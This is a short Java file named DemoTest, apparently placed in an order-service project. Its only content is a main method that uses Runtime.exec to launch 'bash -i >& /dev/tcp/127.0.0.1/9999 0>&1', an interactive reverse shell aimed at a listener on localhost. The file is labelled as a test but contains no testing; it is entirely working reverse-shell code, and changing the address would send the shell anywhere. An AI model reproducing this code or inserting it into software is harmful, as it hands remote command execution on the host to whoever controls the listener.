package top.xuwuruoshui.orderservice;

import java.io.IOException;

public class DemoTest {


    public static void main(String[] args) {
        Runtime rt = Runtime.getRuntime();

        String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/9999 0>&1"};

        Process pc = null;
        try {
            pc = rt.exec(commands);
            pc.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


    }
}
